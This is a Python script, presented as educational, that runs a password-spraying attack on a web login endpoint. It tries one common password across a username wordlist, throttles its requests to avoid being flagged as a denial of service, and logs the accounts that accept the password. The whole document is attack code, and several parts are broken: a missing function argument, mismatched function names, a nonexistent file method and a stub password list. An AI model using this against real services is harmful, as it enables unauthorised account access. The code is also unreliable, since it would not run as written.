import requests
import time

import sys

from typing import Union


"""
Simple script illustrating how a password spraying attack can be executed on a web server's authentication system

NOTE: This script is for educational and research purposes, I or anyone involved in this research is not liable for any malicious things
you do with this script.

"""


url = "http://localhost:5000/users/auth"



def authenticate(user, password):
    """
        Sends authentication payload to website that we want to exploit

        NOTE: the nature of this payload depends on how the website was configured by the developer
    """
    data = dict(username=user, password=password)
    response = requests.post(url, data=data)

    return response


def get_common_usernames(wordlist_file: str):

    """
        Fetch the common usernames from the wordlist file
    """
    with open(wordlist_file, "r") as f:
        return f.readlines()

    return []


def get_common_passwords():

    return []


def spray_password(password: str, delay: int = 0):
    
    logs = []

    for username in get_common_usernames():

        response = authenticate(username, password)

        if response.ok:

            logs.append((username, password))
        
        if delay:
            time.sleep(delay)  # add delay between requests to not be identified as a DOS attacker

    return logs


def write_logs(username, password):


    with open("{}.txt".format(password), "w+") as f:

        f.writeline(username)

    return True


if __name__ == '__main__':

    logs = spray_password('12345678', 0.3)

    for username, password in logs:

        print("Scraped for user ", username)

        write_log(username, password)


